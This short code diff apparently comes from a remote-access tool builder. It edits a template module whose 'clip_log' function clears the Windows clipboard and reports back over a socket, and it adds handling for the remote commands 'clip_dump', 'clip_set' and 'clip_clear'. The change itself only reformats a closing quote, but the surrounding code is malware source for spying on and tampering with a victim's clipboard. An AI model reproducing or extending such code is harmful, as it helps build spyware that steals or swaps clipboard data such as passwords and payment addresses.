@@ -25,8 +25,7 @@ def clip_log(option):
         win32clipboard.OpenClipboard()
         win32clipboard.EmptyClipboard()
         win32clipboard.CloseClipboard()
-        s.sendall('[+]Cleared clipboard')
-''')
+        s.sendall('[+]Cleared clipboard')''')
         config.logics.append('''
             elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                 clip_log(data)''')
